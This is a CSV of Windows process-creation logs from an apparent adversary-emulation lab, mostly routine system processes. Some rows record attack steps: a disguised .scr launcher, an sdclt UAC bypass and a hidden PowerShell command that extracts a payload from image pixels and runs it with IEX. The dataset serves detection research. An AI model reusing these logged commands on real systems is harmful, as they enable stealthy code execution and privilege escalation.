ProcessName,SubjectUserName,@timestamp,host,Hostname,EventID,SubjectLogonId,ProcessId,LogonType,TargetLogonId,WorkstationName,IpAddress,TargetUserName,PrivilegeList,CommandLine,ParentProcessName,NewProcessId,NewProcessPath,NewProcessName,ParentProcessNameOnly,suspicious_office_spawn,suspicious_svchost,exit_time,duration_seconds
,NEWYORK$,2020-05-02 03:03:33.318000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0xf20,,0x0,,,-,,"""CollectGuestLogs.exe"" -Mode:ga -FileName:C:\WindowsAzure\CollectGuestLogsTemp\c95ce60d-c0d8-4d55-9bfc-3a9937bf113e.zip",C:\WindowsAzure\Packages\WaAppAgent.exe,0x12a4,"""CollectGuestLogs.exe""",collectguestlogs.exe,waappagent.exe,False,False,2020-05-02 03:03:51.548000+00:00,18.23
,NEWYORK$,2020-05-02 03:03:33.319000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x12a4,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\WindowsAzure\Packages\CollectGuestLogs.exe,0x17d4,\??\C:\windows\system32\conhost.exe,conhost.exe,collectguestlogs.exe,False,False,2020-05-02 03:03:51.548000+00:00,18.229000000000003
,NEWYORK$,2020-05-02 03:03:33.333000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x2b8,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\System32\services.exe,0xcc0,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:06:36.411000+00:00,183.078
,pbeesly,2020-05-02 03:03:35.383000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf24,,0x0,,,-,,"""C:\Program Files\SysinternalsSuite\sdelete64.exe"" /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x2290,"""C:\Program",program,powershell.exe,False,False,2020-05-02 03:03:38.424000+00:00,3.0410000000000004
,NEWYORK$,2020-05-02 03:03:43.459000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x12a4,,0x0,,,-,,"""cmd""",C:\WindowsAzure\Packages\CollectGuestLogs.exe,0x624,"""cmd""",cmd,collectguestlogs.exe,False,False,2020-05-02 03:03:43.465000+00:00,0.006
,NEWYORK$,2020-05-02 03:03:43.459000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x624,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe,0x698,\??\C:\windows\system32\conhost.exe,conhost.exe,cmd.exe,False,False,2020-05-02 03:03:43.466000+00:00,0.007
,SCRANTON$,2020-05-02 03:04:05.737000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x2268,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:05:36.251000+00:00,90.51400000000001
,SCRANTON$,2020-05-02 02:57:03.854000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe6_ Global\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",C:\Windows\System32\SearchIndexer.exe,0x1038,"""C:\windows\system32\SearchProtocolHost.exe""",searchprotocolhost.exe,searchindexer.exe,False,False,2020-05-02 02:58:50.310000+00:00,106.456
,SCRANTON$,2020-05-02 02:57:03.858000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780 ",C:\Windows\System32\SearchIndexer.exe,0x1f18,"""C:\windows\system32\SearchFilterHost.exe""",searchfilterhost.exe,searchindexer.exe,False,False,2020-05-02 02:58:50.311000+00:00,106.453
,pbeesly,2020-05-02 02:57:13.974000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x214c,,0x0,,,-,,\\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c,C:\ProgramData\victim\â€®cod.3aka3.scr,0xc50,\\?\C:\windows\system32\conhost.exe,conhost.exe,â€®cod.3aka3.scr,False,False,2020-05-02 02:59:22.531000+00:00,128.55700000000002
,pbeesly,2020-05-02 02:57:13.974000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x214c,,0x0,,,-,,"""C:\windows\system32\cmd.exe""",C:\ProgramData\victim\â€®cod.3aka3.scr,0xd98,"""C:\windows\system32\cmd.exe""",cmd.exe,â€®cod.3aka3.scr,False,False,2020-05-02 02:59:22.531000+00:00,128.55700000000002
,pbeesly,2020-05-02 02:57:17.048000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0xd98,,0x0,,,-,,powershell,C:\Windows\System32\cmd.exe,0x1ad4,powershell,powershell,cmd.exe,False,False,2020-05-02 02:58:34.683000+00:00,77.635
,pbeesly,2020-05-02 02:58:43.786000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0xd98,,0x0,,,-,,C:\windows\system32\sdclt.exe,C:\Windows\System32\cmd.exe,0x1518,C:\windows\system32\sdclt.exe,sdclt.exe,cmd.exe,False,False,2020-05-02 02:58:43.787000+00:00,0.001
,pbeesly,2020-05-02 02:58:43.787000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0xd98,,0x0,,,-,,"""C:\windows\system32\sdclt.exe"" ",C:\Windows\System32\cmd.exe,0x2388,"""C:\windows\system32\sdclt.exe""",sdclt.exe,cmd.exe,False,False,2020-05-02 02:58:43.790000+00:00,0.003
,SCRANTON$,2020-05-02 02:58:43.790000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0xbf4,,0x0,,,-,,consent.exe 3060 300 0000018832821060,C:\Windows\System32\svchost.exe,0x1d64,consent.exe,consent.exe,svchost.exe,False,False,2020-05-02 02:58:44.820000+00:00,1.03
,SCRANTON$,2020-05-02 02:58:44.826000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0xd98,,0x372e81,,,pbeesly,,"""C:\windows\system32\sdclt.exe"" ",C:\Windows\System32\cmd.exe,0x195c,"""C:\windows\system32\sdclt.exe""",sdclt.exe,cmd.exe,False,False,2020-05-02 02:58:44.833000+00:00,0.007
,pbeesly,2020-05-02 02:58:44.833000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0x195c,,0x0,,,-,,"""C:\Windows\System32\control.exe""  /name Microsoft.BackupAndRestoreCenter",C:\Windows\System32\sdclt.exe,0x131c,"""C:\Windows\System32\control.exe""",control.exe,sdclt.exe,False,False,2020-05-02 02:58:44.921000+00:00,0.08800000000000001
,SCRANTON$,2020-05-02 02:58:44.836000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x372e81,,,pbeesly,,C:\windows\SysWOW64\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B},C:\Windows\System32\svchost.exe,0x1c4c,C:\windows\SysWOW64\DllHost.exe,dllhost.exe,svchost.exe,False,False,2020-05-02 02:58:50.310000+00:00,5.474
,pbeesly,2020-05-02 02:58:44.904000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0x131c,,0x0,,,-,,"""PowerShell.exe"" -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""",C:\Windows\System32\control.exe,0xba0,"""PowerShell.exe""",powershell.exe,control.exe,False,False,2020-05-02 03:18:33.253000+00:00,1188.3490000000002
,pbeesly,2020-05-02 02:58:44.912000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x1064,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:18:33.257000+00:00,1188.345
,pbeesly,2020-05-02 02:58:46.089000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x1030,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe""",csc.exe,powershell.exe,False,False,2020-05-02 02:58:47.101000+00:00,1.012
,pbeesly,2020-05-02 02:58:46.093000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0x1030,,0x0,,,-,,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\pbeesly\AppData\Local\Temp\RES2758.tmp"" ""c:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\CSC6B76613243A54474837EBEC19BC0E56A.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,0x2150,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,cvtres.exe,csc.exe,False,False,2020-05-02 02:58:46.097000+00:00,0.004
,NASHUA$,2020-05-02 02:59:37.812000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1",C:\Windows\System32\svchost.exe,0x103c,"""BackgroundTransferHost.exe""",backgroundtransferhost.exe,svchost.exe,False,False,2020-05-02 02:59:40.064000+00:00,2.2520000000000002
,NASHUA$,2020-05-02 02:59:38.949000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x23e8,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:41.215000+00:00,2.266
,pbeesly,2020-05-02 02:59:05.354000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0xd98,,0x0,,,-,,powershell,C:\Windows\System32\cmd.exe,0xef8,powershell,powershell,cmd.exe,False,False,2020-05-02 02:59:21.314000+00:00,15.96
,SCRANTON$,2020-05-02 02:59:16.675000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x884,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:21.315000+00:00,4.640000000000001
,SCRANTON$,2020-05-02 02:59:16.684000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1a7c,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:00:37.246000+00:00,80.56200000000001
,SCRANTON$,2020-05-02 02:59:17.898000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1",C:\Windows\System32\svchost.exe,0xb74,"""BackgroundTransferHost.exe""",backgroundtransferhost.exe,svchost.exe,False,False,2020-05-02 02:59:18.976000+00:00,1.078
,SCRANTON$,2020-05-02 02:59:19.079000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1",C:\Windows\System32\svchost.exe,0x450,"""BackgroundTransferHost.exe""",backgroundtransferhost.exe,svchost.exe,False,False,2020-05-02 02:59:24.838000+00:00,5.759
,SCRANTON$,2020-05-02 02:59:23.719000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0xf10,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:27.305000+00:00,3.5860000000000003
,SCRANTON$,2020-05-02 02:59:24.842000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1",C:\Windows\System32\svchost.exe,0x6c,"""BackgroundTransferHost.exe""",backgroundtransferhost.exe,svchost.exe,False,False,2020-05-02 02:59:26.134000+00:00,1.292
,SCRANTON$,2020-05-02 02:59:50.621000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1320,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:51.996000+00:00,1.375
,NASHUA$,2020-05-02 03:00:10.287000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1bdc,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:18:28.084000+00:00,1097.797
,SCRANTON$,2020-05-02 03:00:10.287000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe7_ Global\UsGthrCtrlFltPipeMssGthrPipe7 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",C:\Windows\System32\SearchIndexer.exe,0x1bb8,"""C:\windows\system32\SearchProtocolHost.exe""",searchprotocolhost.exe,searchindexer.exe,False,False,2020-05-02 03:02:50.746000+00:00,160.459
,SCRANTON$,2020-05-02 03:00:10.295000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780 ",C:\Windows\System32\SearchIndexer.exe,0xd00,"""C:\windows\system32\SearchFilterHost.exe""",searchfilterhost.exe,searchindexer.exe,False,False,2020-05-02 03:02:50.746000+00:00,160.45100000000002
,NEWYORK$,2020-05-02 03:01:29.774000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x14e0,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:02:49.631000+00:00,79.857
,NEWYORK$,2020-05-02 03:16:36.688000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x15f8,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:17:50.805000+00:00,74.117
,NEWYORK$,2020-05-02 03:16:39.321000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x3e4,,,NEWYORK$,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x610,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:17:50.805000+00:00,71.48400000000001
,pbeesly,2020-05-02 03:16:42.978000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0x87c,,0x0,,,-,,C:\windows\system32\cmd.exe,C:\Windows\Temp\python.exe,0x2244,C:\windows\system32\cmd.exe,cmd.exe,python.exe,False,False,2020-05-02 03:17:57.838000+00:00,74.86
,SCRANTON$,2020-05-02 03:05:30.723000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\System32\svchost.exe -k WerSvcGroup,C:\Windows\System32\services.exe,0x1604,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:33.442000+00:00,122.71900000000001
,SCRANTON$,2020-05-02 03:05:30.728000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1604,,0x0,,,-,,C:\windows\system32\WerFault.exe -pss -s 556 -p 6848 -ip 6848,C:\Windows\System32\svchost.exe,0xf4c,C:\windows\system32\WerFault.exe,werfault.exe,svchost.exe,False,False,2020-05-02 03:05:30.731000+00:00,0.003
,SCRANTON$,2020-05-02 03:05:30.735000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1ac0,,0x3731f3,,,pbeesly,,C:\windows\system32\WerFault.exe -u -p 6848 -s 1848,C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\SkypeApp.exe,0x19ec,C:\windows\system32\WerFault.exe,werfault.exe,skypeapp.exe,False,False,2020-05-02 03:05:33.176000+00:00,2.4410000000000003
,SCRANTON$,2020-05-02 03:05:30.742000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x5a8,,0x372e81,,,pbeesly,,taskhostw.exe Event,C:\Windows\System32\svchost.exe,0x60c,taskhostw.exe,taskhostw.exe,svchost.exe,False,False,2020-05-02 03:05:30.751000+00:00,0.009000000000000001
,SCRANTON$,2020-05-02 03:05:31.851000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,C:\Windows\System32\services.exe,0x20cc,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:42.051000+00:00,190.20000000000002
,pbeesly,2020-05-02 03:05:58.512000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf0c,,0x0,,,-,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xdd8,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""",powershell.exe,powershell.exe,False,False,2020-05-02 03:07:56.859000+00:00,118.34700000000001
,pbeesly,2020-05-02 03:05:58.512000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xdd8,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x196c,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:07:56.859000+00:00,118.34700000000001
,pbeesly,2020-05-02 03:06:09.919000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x1158,,0x0,,,-,,"""C:\windows\system32\notepad.exe"" ",C:\Windows\explorer.exe,0x1b54,"""C:\windows\system32\notepad.exe""",notepad.exe,explorer.exe,False,False,2020-05-02 03:18:25.038000+00:00,735.119
,SCRANTON$,2020-05-02 03:06:14.119000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x18f4,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:07:15.085000+00:00,60.966
,NEWYORK$,2020-05-02 03:06:14.178000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x788,,0x0,,,-,,C:\windows\system32\usoclient.exe StartScan,C:\Windows\System32\svchost.exe,0x6f8,C:\windows\system32\usoclient.exe,usoclient.exe,svchost.exe,False,False,2020-05-02 03:06:15.176000+00:00,0.9980000000000001
,NEWYORK$,2020-05-02 03:06:14.184000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x2b8,,0x0,,,-,,C:\windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc,C:\Windows\System32\services.exe,0x1214,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:15.089000+00:00,60.905
,NEWYORK$,2020-05-02 03:06:16.211000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x788,,0x0,,,-,,C:\windows\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2),C:\Windows\System32\svchost.exe,0x11a4,C:\windows\System32\dsregcmd.exe,dsregcmd.exe,svchost.exe,False,False,2020-05-02 03:06:16.219000+00:00,0.008
,NEWYORK$,2020-05-02 03:06:16.211000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x11a4,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\dsregcmd.exe,0x1494,\??\C:\windows\system32\conhost.exe,conhost.exe,dsregcmd.exe,False,False,2020-05-02 03:06:16.219000+00:00,0.008
,LOCAL SERVICE,2020-05-02 03:08:52.471000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e5,0x2318,,0x372e81,,,pbeesly,,"rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",C:\Windows\System32\svchost.exe,0xcc4,rundll32.exe,rundll32.exe,svchost.exe,False,False,2020-05-02 03:08:52.479000+00:00,0.008
,LOCAL SERVICE,2020-05-02 03:08:52.481000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e5,0x2318,,0x372e81,,,pbeesly,,"rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",C:\Windows\System32\svchost.exe,0x674,rundll32.exe,rundll32.exe,svchost.exe,False,False,2020-05-02 03:08:52.483000+00:00,0.002
,SCRANTON$,2020-05-02 03:08:52.499000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1f40,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:10:23.340000+00:00,90.84100000000001
,NASHUA$,2020-05-02 03:09:24.805000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x85aad2,,,pbeesly,,C:\windows\system32\wsmprovhost.exe -Embedding,C:\Windows\System32\svchost.exe,0x1e28,C:\windows\system32\wsmprovhost.exe,wsmprovhost.exe,svchost.exe,False,False,2020-05-02 03:09:31.094000+00:00,6.289000000000001
,LOCAL SERVICE,2020-05-02 03:10:24.443000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e5,0x2318,,0x372e81,,,pbeesly,,"rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",C:\Windows\System32\svchost.exe,0x3c4,rundll32.exe,rundll32.exe,svchost.exe,False,False,2020-05-02 03:10:24.444000+00:00,0.001
,LOCAL SERVICE,2020-05-02 03:10:24.446000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e5,0x2318,,0x372e81,,,pbeesly,,"rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",C:\Windows\System32\svchost.exe,0x2184,rundll32.exe,rundll32.exe,svchost.exe,False,False,2020-05-02 03:10:24.448000+00:00,0.002
,LOCAL SERVICE,2020-05-02 03:10:24.451000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e5,0x2318,,0x372e81,,,pbeesly,,"rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav",C:\Windows\System32\svchost.exe,0x868,rundll32.exe,rundll32.exe,svchost.exe,False,False,2020-05-02 03:10:24.455000+00:00,0.004
,SCRANTON$,2020-05-02 03:10:24.460000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x47c,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:11:55.428000+00:00,90.968
,NASHUA$,2020-05-02 03:10:40.663000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x51c,,0x3e4,,,NASHUA$,,gpupdate.exe /target:computer,C:\Windows\System32\svchost.exe,0xca4,gpupdate.exe,gpupdate.exe,svchost.exe,False,False,2020-05-02 03:10:46.801000+00:00,6.138000000000001
,NASHUA$,2020-05-02 03:10:40.664000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e4,0xca4,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\gpupdate.exe,0x4a8,\??\C:\windows\system32\conhost.exe,conhost.exe,gpupdate.exe,False,False,2020-05-02 03:10:46.802000+00:00,6.138000000000001
